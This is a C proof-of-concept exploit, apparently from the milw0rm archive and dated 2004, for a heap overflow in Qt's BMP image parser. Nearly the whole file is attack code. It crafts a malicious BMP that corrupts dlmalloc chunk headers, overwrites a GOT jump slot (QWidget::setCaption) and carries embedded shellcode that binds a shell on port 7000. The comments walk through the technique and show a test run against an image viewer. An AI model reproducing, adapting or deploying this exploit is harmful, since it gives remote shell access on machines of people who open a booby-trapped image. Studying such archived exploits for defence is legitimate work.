/*
*  heap overflow exploit for qt bmp parsing bug
*  infamous42md AT hotpop DOT com
*
*  shouts to mitakeet, MB, and peeps @hackaholic
*
*  ok, pretty standard heap overflow here. we spill across our chunk and
*  overwrite the boundary tag for next chunk.  the only problems i had was
*  finding a miserable jump slot to overwrite.  i thought i could just
*  overwrite malloc jump slot, but umm, well i'm not sure how to get the jump
*  slot for malloc from the shared library file.  it is some sort of offset
*  from somewhere, and i'm not sure where.  using the malloc jump slot from the
*  program you're exploiting doesn't seem to work.  sorry i'm not an expert on
*  linking and loading yet, maybe after i read the 'linker loader' book next
*  semester i will be... but perhaps someone could explain this to me?  so
*  anyways, instead i hijacked QWidget::setCaption() jump slot.  and how did i
*  find that? well, it sure wasn't a 1337 way.  i dumped the GOT in gdb until i
*  found the address.  so the below adddress is for Qt multithreaded 3.3.2. i'm
*  sure it is different for other machines/platforms, so you'll need to do some
*  digging i'm guessing.  the program i used to test all this was qvv image
*  viewer b/c it was small and didn't take 37 hours to d/l like Konqueror would
*  of.  obviously the heap layout is going to vary greatly from program to
*  program, and depending on at what point in a given program the bmp is
*  loaded, so i can't see this being a very reliable way to exploit.  rather
*  just a POC.
*
* [n00b@localho.outernet] netstat -ant | grep 7000
* [n00b@localho.outernet] gcc -Wall haqt.c
* [n00b@localho.outernet] ./a.out 0x80be9f8 8
* [n00b@localho.outernet] ./qvv suckit.bmp
* [n00b@localho.outernet] netstat -ant | grep 7000
* tcp        0      0 0.0.0.0:7000            0.0.0.0:*               LISTEN
* [n00b@localho.outernet] ./a.out
*         Usage: ./a.out < retaddr > [ align ]
*
*/
#include <stdio.h>
#include <sys/types.h>
#include <fcntl.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <netinet/in.h>

#define RETLOC 0x808cd0c    /* jump slot for QWidget::setCaption */
#define ALIGN 8
#define die(x) do{perror(x); exit(EXIT_FAILURE);}while(0)
#define BS 0x10000
#define OUTFILE "suckit.bmp"
#define NCHUNK_BYTES 100

/*  a bitmap header structure */
#define BMP_HDR_SZ sizeof(struct bmp)
struct bmp {
   u_char  type[2];
   u_int   bfsize,
           reserved,
           offbits,    /* BMP_FILEHDR_SIZE */
           bisize,     /* 40 */
           width,      /* 8 */
           height;     /* 18 */
   u_short planes,     /* 1 */
           bitcount;   /* 8 */
   u_int   compres,    /* 1 */
           szimg,
           xppm,
           ypppm,
           clrused,    /* 1 */
           clrimportant;
} __attribute__ ((packed));

/*  a dlmalloc chunk descriptor */
#define CHUNKSZ sizeof(mchunk_t)
typedef struct _mchunk {
   size_t  prevsz;
   size_t  sz;
   long    fd;
   long    bk;
} mchunk_t;

/* call them on port 7000, mine, and needs to lose some weight */
#define SHELL_LEN (sizeof(remote)-1)
char remote[] =
"\xeb\x0a""1234567890"  /* jump */
"\x31\xc0\x50\x50\x66\xc7\x44\x24\x02\x1b\x58\xc6\x04\x24\x02\x89\xe6"
"\xb0\x02\xcd\x80\x85\xc0\x74\x08\x31\xc0\x31\xdb\xb0\x01\xcd\x80\x50"
"\x6a\x01\x6a\x02\x89\xe1\x31\xdb\xb0\x66\xb3\x01\xcd\x80\x89\xc5\x6a"
"\x10\x56\x50\x89\xe1\xb0\x66\xb3\x02\xcd\x80\x6a\x01\x55\x89\xe1\x31"
"\xc0\x31\xdb\xb0\x66\xb3\x04\xcd\x80\x31\xc0\x50\x50\x55\x89\xe1\xb0"
"\x66\xb3\x05\xcd\x80\x89\xc5\x31\xc0\x89\xeb\x31\xc9\xb0\x3f\xcd\x80"
"\x41\x80\xf9\x03\x7c\xf6\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62"
"\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80\xa1\x5f\x66\x6e\x69";

void make_bmp(char *buf, int len)
{
   int fd = 0;

   /* create the 3vil file */
   if( (fd = open(OUTFILE, O_RDWR|O_CREAT, 0666)) < 0)
       die("open");

   if(write(fd, buf, len) < 0)
       die("write");

   close(fd);
}

/*
*
*/
int main(int argc, char **argv)
{
   int len = 0, x = 0, align = ALIGN;
   char    buf[BS];
   u_long  retaddr;
   struct bmp   bmp;
   mchunk_t    chunk;

   if(argc < 2){
       fprintf(stderr, "\tUsage: %s < retaddr > [ align ]\n", argv[0]);
       return EXIT_FAILURE;
   }
   if(argc > 2){
       align = atoi(argv[2]);
       if(align < 0 || align > 15)
           die("get bent bitch");
   }
   sscanf(argv[1], "%lx", &retaddr);

   /* setup bitmap header info */
   memset(&bmp, 0, BMP_HDR_SZ);
   bmp.type[0] = 'B', bmp.type[1] = 'M';
   bmp.bfsize = 3126;
   bmp.bisize = 40;
   bmp.planes = 1;
   bmp.bitcount = 8;
   bmp.compres = 1;
   bmp.clrused = 1;
   bmp.width = 8;
   bmp.height = 18;

   /* and the chunk */
   chunk.prevsz = 224;
   chunk.sz = 0xfffffffc;
   chunk.fd = RETLOC - 12;
   chunk.bk = retaddr;

   /* and now setup the buffer */
   memcpy(buf, &bmp, BMP_HDR_SZ);
   len += BMP_HDR_SZ;

   /* to pass some checks */
   len += 4;           /* the color table */
   buf[len++] = 0;     /* to pass the if() */
   buf[len++] = 0xff;  /* overwrite len */

   /*
    * and now the fun begins:
    * first splatter the chunks, then the shellcode
    */
   len += align;
   for(x = 0; x < NCHUNK_BYTES-CHUNKSZ-1; x += CHUNKSZ)
       memcpy(buf+len+x, &chunk, CHUNKSZ);
   len += x;
   memcpy(buf+len, remote, SHELL_LEN);
   len += SHELL_LEN;

   make_bmp(buf, len);
   return 0;
}


// milw0rm.com [2004-08-21]
